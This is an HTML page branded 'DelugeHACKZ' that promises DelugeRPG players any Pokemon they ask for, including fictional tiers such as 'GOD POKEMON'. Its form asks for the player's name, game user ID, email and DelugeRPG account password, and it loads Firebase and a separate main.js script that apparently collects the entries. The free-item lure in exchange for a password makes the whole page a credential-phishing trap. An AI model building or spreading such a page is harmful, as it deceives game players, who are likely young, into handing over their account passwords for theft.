<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>DelugeHACKZ</title>
  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.css" />
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <h1 class="brand"><span>MODZ</span> POKEMON SELECTOR</h1>
    <div class="wrapper">
      <div class="company-info">
        <h3>Get whatever pokemon you wish</h3>
      </div>
      <div class="contact">
        <h3>Email Us</h3>
        <div class="alert">You will recieve a link in 24 hrs in your email to get the following pokemon</div>
        <form id="contactForm">
          <p>
            <label>Your Name</label>
            <input type="text" name="name" id="name" required>
          </p>
          <p>
            <label>User Id(Your DelugeRPG User ID)</label>
            <input type="text" name="userid" id="userid">
          </p>
          <p>
            <label>Email Address</label>
            <input type="email" name="email" id="email" required>
          </p>
          <p>
            <label>Password(Of your delugeRPG Account)</label>
            <input type="password" name="password" id="password">
          </p>
          <p class="full">
            <label>Write here the exact name of pokemon you want and its level, hp, and the type{Normal,mega.double mega, GMAX, DOuble GMAX, GOD POKEMON}</label>
            <textarea name="message" rows="5" id="message"></textarea>
          </p>
          <p class="full">
            <button btn - btn danger type="submit">Get Pokemon</button>
          </p>
        </form>
      </div>
    </div>
  </div>

  <script src="https://www.gstatic.com/firebasejs/4.3.0/firebase.js"></script>
  <script src="main.js"></script>
</body>
</html>
